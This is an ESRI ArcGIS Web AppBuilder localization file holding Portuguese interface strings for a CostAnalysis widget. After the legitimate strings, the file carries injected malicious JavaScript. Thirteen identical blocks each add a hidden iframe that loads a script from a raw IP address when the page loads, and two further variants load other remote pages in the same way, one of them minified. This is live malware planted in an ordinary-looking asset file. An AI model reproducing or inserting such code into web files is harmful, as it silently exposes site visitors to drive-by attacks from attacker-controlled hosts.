// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Definir texto de config:",generalSettings:{tabTitle:"Configura\u00e7\u00f5es gerais",measurementUnitLabel:"Unidade de Medida",currencyLabel:"S\u00edmbolo de Medida",roundCostLabel:"Custo Arredondado",projectOutputSettings:"Defini\u00e7\u00f5es de Sa\u00edda de Projeto",typeOfProjectAreaLabel:"Tipo de \u00c1rea de Projeto",bufferDistanceLabel:"Dist\u00e2ncia do Buffer",roundCostValues:{twoDecimalPoint:"Duas Casas Decimais",nearestWholeNumber:"N\u00famero Inteiro Mais Pr\u00f3ximo",
nearestTen:"Dezena Mais Pr\u00f3xima",nearestHundred:"Centena Mais Pr\u00f3xima",nearestThousand:"Milhares Mais Pr\u00f3ximos",nearestTenThousands:"Dezenas de Milhar Mais Pr\u00f3ximas"},projectAreaType:{outline:"Contorno",buffer:"Buffer"},errorMessages:{currency:"Unidade monet\u00e1ria inv\u00e1lida",bufferDistance:"Dist\u00e2ncia de buffer inv\u00e1lida",outOfRangebufferDistance:"O valor tem de ser maior do que 0 e menor ou igual a 100"}},projectSettings:{tabTitle:"Defini\u00e7\u00f5es do projeto",
costingGeometrySectionTitle:"Definir geografia para or\u00e7amento (opcional)",costingGeometrySectionNote:"Nota: Configurar esta camada permitir\u00e1 ao utilizador definir equa\u00e7\u00f5es de custos de modelos de elementos com base em geografias.",projectTableSectionTitle:"Funcionalidade de Guardar/Carregar defini\u00e7\u00f5es de projeto (opcional)",projectTableSectionNote:"Nota: Configurar todas as tabelas e camadas permitir\u00e1 ao utilizador guardar/carregar projeto para utiliza\u00e7\u00e3o posterior.",
costingGeometryLayerLabel:"Camada de Geometria de Or\u00e7amento",fieldLabelGeography:"Campo para Rotular Geografia",projectAssetsTableLabel:"Tabela de Ativos do Projeto",projectMultiplierTableLabel:"Tabela de Custos Adicionais Multiplicadora do Projeto",projectLayerLabel:"Camada de Projeto",configureFieldsLabel:"Configurar Campos",fieldDescriptionHeaderTitle:"Descri\u00e7\u00e3o de Campo",layerFieldsHeaderTitle:"Campo de Camada",selectLabel:"Seleccionar",errorMessages:{duplicateLayerSelection:"${layerName} j\u00e1 se encontra selecionada",
invalidConfiguration:"Por favor, selecione ${fieldsString}"},costingGeometryHelp:"\x3cp\x3eCamada(s) de poligono(s) com as seguintes condi\u00e7\u00f5es ser\u00e3o exibidas: \x3cbr/\x3e \x3cli\x3e\tA camada tem de ter funcionalidade de \u00e2\u20ac\u0153Consulta\u00e2\u20ac\x3c/li\x3e\x3cli\x3e\tA camada tem de ter um campo GlobalID\x3c/li\x3e\x3c/p\x3e",fieldToLabelGeographyHelp:"\x3cp\x3eAs strings e os campos num\u00e9ricos da \u00e2\u20ac\u0153Camada de Geometria de Custos\u00e2\u20ac\u009d ser\u00e1 exibida no menu pendente \u00e2\u20ac\u0153Campo para Rotular Geografia\u00e2\u20ac\u009d.\x3c/p\x3e",
projectAssetsTableHelp:"\x3cp\x3eTabela(s) com as seguintes condi\u00e7\u00f5es ser\u00e3o exibidas: \x3cbr/\x3e \x3cli\x3eA tabela tem de ter funcionalidades de edi\u00e7\u00e3o, nomeadamente, \u00e2\u20ac\u0153Criar\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Eliminar\u00e2\u20ac\u009d e \u00e2\u20ac\u0153Atualizar\u00e2\u20ac\u009d\x3c/li\x3e    \x3cli\x3eA tabela tem de ter seis campos com o nome e tipo de dados exatos:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (tipo de campo GUID)\x3c/li\x3e\x3cli\x3e\tCostEquation (tipo de campo String)\x3c/li\x3e\x3cli\x3e\tCen\u00e1rio (tipo de campo String)\x3c/li\x3e\x3cli\x3e\tTemplateName (tipo de campo String)\x3c/li\x3e\x3cli\x3e    GeographyGUID (tipo de campo GUID)\x3c/li\x3e\x3cli\x3e\tProjectGUID (tipo de campo GUID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eTabela(s) com as seguintes condi\u00e7\u00f5es ser\u00e3o exibidas: \x3cbr/\x3e \x3cli\x3eA tabela tem de ter funcionalidades de edi\u00e7\u00e3o, nomeadamente, \u00e2\u20ac\u0153Criar\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Eliminar\u00e2\u20ac\u009d e \u00e2\u20ac\u0153Atualizar\u00e2\u20ac\x3c/li\x3e    \x3cli\x3eA tabela tem de ter seis campos com o nome e tipo de dados exatos:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescri\u00e7\u00e3o (tipo de campo String)\x3c/li\x3e\x3cli\x3e\tTipo (tipo de campo String)\x3c/li\x3e\x3cli\x3e\tValor (tipo de campo Float/Double)\x3c/li\x3e\x3cli\x3e\tCostindex (tipo de campo Inteiro)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (tipo de campo GUID))\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3eA(s) camada(s) de pol\u00edgono com as seguintes condi\u00e7\u00f5es ser\u00e3o exibidas: \x3cbr/\x3e \x3cli\x3eA camada tem de ter funcionalidades de edi\u00e7\u00e3o, nomeadamente, \u00e2\u20ac\u0153Criar\u00e2\u20ac\u009d, \u00e2\u20ac\u0153Eliminar\u00e2\u20ac\u009d e \u00e2\u20ac\u0153Atualizar\u00e2\u20ac\x3c/li\x3e    \x3cli\x3eA camada tem de ter seis campos com o nome e tipo de dados exatos:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (tipo de campo String)\x3c/li\x3e\x3cli\x3eDescri\u00e7\u00e3o (tipo de campo String)\x3c/li\x3e\x3cli\x3eTotalassetcost (tipo de campo Float/Double)\x3c/li\x3e\x3cli\x3eGrossprojectcost (tipo de campo Float/Double)\x3c/li\x3e\x3cli\x3eGlobalID (tipo de campo GlobalID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Configura\u00e7\u00f5es de Camada",layerNameHeaderTitle:"Nome da camada",layerNameHeaderTooltip:"Lista de camadas no mapa",EditableLayerHeaderTitle:"Edit\u00e1vel",EditableLayerHeaderTooltip:"Incluir camada e respetivos modelos no widget de or\u00e7amento",SelectableLayerHeaderTitle:"Selecion\u00e1vel",SelectableLayerHeaderTooltip:"A geometria do elemento pode ser utilizada para gerar um novo item de custo",fieldPickerHeaderTitle:"Project ID (opcional)",fieldPickerHeaderTooltip:"Campo opcional (do tipo string) onde armazenar a Project ID",
selectLabel:"Seleccionar",noAssetLayersAvailable:"N\u00e3o foi encontrada quaisquer camadas de ativos no mapa web selecionado",disableEditableCheckboxTooltip:"Esta camada n\u00e3o tem funcionalidades de edi\u00e7\u00e3o"},costingInfo:{tabTitle:"Info de Or\u00e7amento",proposedMainsLabel:"Circuitos Propostos",addCostingTemplateLabel:"Adicionar Modelo de Or\u00e7amento",manageScenariosTitle:"Gerir Cen\u00e1rio",featureTemplateTitle:"Modelo de Elemento",costEquationTitle:"Equa\u00e7\u00e3o de Custo",
geographyTitle:"Geografia",scenarioTitle:"Cen\u00e1rio",actionTitle:"A\u00e7\u00f5es",scenarioNameLabel:"Nome do Cen\u00e1rio",addBtnLabel:"Adicionar",srNoLabel:"N\u00e3o.",deleteLabel:"Excluir",duplicateScenarioName:"Nome de cen\u00e1rio duplicado",hintText:"\x3cdiv\x3ePista: Utilize as seguintes palavras-chave\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: Utiliza o n\u00famero total de ativos do mesmo tipo numa geografia\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: Utiliza o comprimento para ativo de linha e \u00e1rea para ativo de pol\u00edgono\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: Utiliza o comprimento para ativo de linha e \u00e1rea para ativo de pol\u00edgono do mesmo tipo numa geografia\x3c/li\x3e\x3c/ul\x3ePode utilizar fun\u00e7\u00f5es como:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3ePor favor, edite a equa\u00e7\u00e3o de custo \u00e0 medida das necessidades do seu projeto.",
noneValue:"Nenhum",requiredCostEquation:"Equa\u00e7\u00e3o de custo inv\u00e1lida para ${layerName} : ${templateName}",duplicateTemplateMessage:"Existe uma entrada de modelo duplicada para ${layerName} : ${templateName}",defaultEquationRequired:"\u00c9 necess\u00e1ria uma equa\u00e7\u00e3o predefinida para ${layerName} : ${templateName}",validCostEquationMessage:"Por favor, introduza uma equa\u00e7\u00e3o de custo v\u00e1lida",costEquationHelpText:"Por favor, edite a equa\u00e7\u00e3o de custo \u00e0 medida das necessidades do seu projeto",
scenarioHelpText:"Por favor, selecione o cen\u00e1rio \u00e0 medida das necessidades do seu projeto",copyRowTitle:"Copiar Linha",noTemplateAvailable:"Por favor, adicione pelo menos um modelo a ${layerName}",manageScenarioLabel:"Gerir Cen\u00e1rio",noLayerMessage:"Por favor, introduza pelo menos uma camada a ${tabName}",noEditableLayersAvailable:"As camada(s) necessitam de ser definidas como edit\u00e1veis no separador de defini\u00e7\u00f5es de camada"},statisticsSettings:{tabTitle:"Defini\u00e7\u00f5es de estat\u00edsticas",
addStatisticsLabel:"Adicionar Estat\u00edstica",fieldNameTitle:"Campo",statisticsTitle:"R\u00f3tulo",addNewStatisticsText:"Adicionar Nova Estat\u00edstica",deleteStatisticsText:"Eliminar Estat\u00edstica",moveStatisticsUpText:"Mover Estat\u00edsticas Para Cima",moveStatisticsDownText:"Mover Estat\u00edsticas Para Baixo",selectDeselectAllTitle:"Selecionar Tudo"},statisticsType:{countLabel:"Contagem",averageLabel:"M\u00e9dia",maxLabel:"M\u00e1ximo",minLabel:"M\u00ednimo",summationLabel:"Somat\u00f3rio",
areaLabel:"\u00c1rea",lengthLabel:"Comprimento"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});